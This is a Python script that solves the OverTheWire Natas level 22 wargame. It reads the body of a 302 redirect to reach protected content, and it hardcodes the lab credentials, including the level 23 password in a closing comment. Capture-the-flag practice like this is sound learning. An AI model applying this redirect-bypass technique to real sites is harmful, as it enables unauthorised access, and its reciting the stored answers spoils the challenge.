from bs4 import BeautifulSoup
import requests

def make():
    res = requests.get(url=url,auth=lvl_pass, params=my_params, cookies=my_cookies)
    #prevent the redirect. Or rather, inspect the redirect contents since the script still executes
    soup = BeautifulSoup(res.history[0].text, 'html.parser')
    return (res, soup)
    
def writeResponse(enumerate = ''):
    with open(f'./response{enumerate}.html', 'w') as browserFile:
        browserFile.write(soup.prettify())
        

url = 'http://natas22.natas.labs.overthewire.org'
lvl_pass = requests.auth.HTTPBasicAuth('natas22','chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')
my_cookies = {"PHPSESSID":'kij2rv5fvgd4v22ekal24idbj7'}
my_params = {"revelio":"true","admin":"1","debug":"true"}

res, soup = make()
writeResponse()

'''
The PHP header function with location sends a 302 code that the browser redirects,
but the script still executes. And since it's the BROWSER redirecting, it's just a simple 
case of making it not do that.

Username: natas23
Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
'''